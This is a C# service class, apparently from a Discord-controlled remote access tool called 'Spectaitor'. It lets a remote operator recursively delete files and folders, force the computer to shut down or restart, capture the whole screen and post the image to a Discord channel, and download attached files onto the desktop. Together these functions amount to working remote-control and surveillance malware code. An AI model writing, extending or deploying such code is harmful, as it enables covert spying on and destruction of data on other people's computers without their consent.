using Discord;
using Discord.WebSocket;
using Spectaitor.Models;
using Spectaitor.Services.Interfacess;
using System.Diagnostics;
using System.Net;
using System.Text;

namespace Spectaitor.Services.Class
{
    public class DeviceMangerService : IDeviceMangerService
    {
        public bool RemoveDirectory(string Path)
        {
            try
            {
                if (Directory.Exists(Path))
                {
                    Directory.Delete(Path, true); 
                    return true;
                }
                else
                {
                    Console.WriteLine("Directory does not exist.");
                    return false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error removing directory: {ex.Message}");
                return false;
            }
        }

        public bool RemoveFile(string Path)
        {
            try
            {
                if (File.Exists(Path))
                {
                    File.Delete(Path); 
                    return true;
                }
                else
                {
                    Console.WriteLine("File does not exist.");
                    return false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error removing file: {ex.Message}");
                return false;
            }
        }

        public void RestartPc()
        {
            try
            {
                Process.Start("shutdown", "/r /t 0"); 
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error restarting PC: {ex.Message}");
            }
        }

        public ReturnModel<string> TakeScreenShot(SocketTextChannel channel)
        {
       try
        {
            string screenshotPath = Path.Combine(Environment.CurrentDirectory, "screenshot.png");

            using (Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                }

                bitmap.Save(screenshotPath);
            }

            var message = channel.SendFileAsync(screenshotPath, "Screen :").GetAwaiter().GetResult();

            File.Delete(screenshotPath);

            return new ReturnModel<string>
            {
                IsSucceeded = true,
                Comment = "Screenshot taken and sent successfully.",
                Value = screenshotPath
            };
        }
        catch (Exception ex)
        {
            return new ReturnModel<string>
            {
                IsSucceeded = false,
                Comment = $"Error taking screenshot: {ex.Message}",
                Value = null
            };
        }

        }

        public void TurnOffPc()
        {
            try
            {
                Process.Start("shutdown", "/s /t 0"); 
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error turning off PC: {ex.Message}");
            }
        }

        public ReturnModel<string> UploadFile(IAttachment attachment,string path)
        {
            try
            {
                byte[] buffer = new byte[32];
                Random r = new Random();
                r.NextBytes(buffer);
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), $"{Encoding.UTF8.GetString(buffer)}FN{attachment.Filename}");
                using (var client = new WebClient())
                {
                    client.DownloadFile(new Uri(attachment.Url), filePath);
                }

                return new ReturnModel<string>
                {
                    IsSucceeded = true,
                    Comment = "File uploaded and saved successfully.",
                    Value = filePath
                };
            }
            catch(Exception ex)
            {
                return new ReturnModel<string>
                {
                    IsSucceeded = false,
                    Comment = $"Error uploading file: {ex.Message}",
                    Value = null
                };
            }
            
           

        }
    }
}
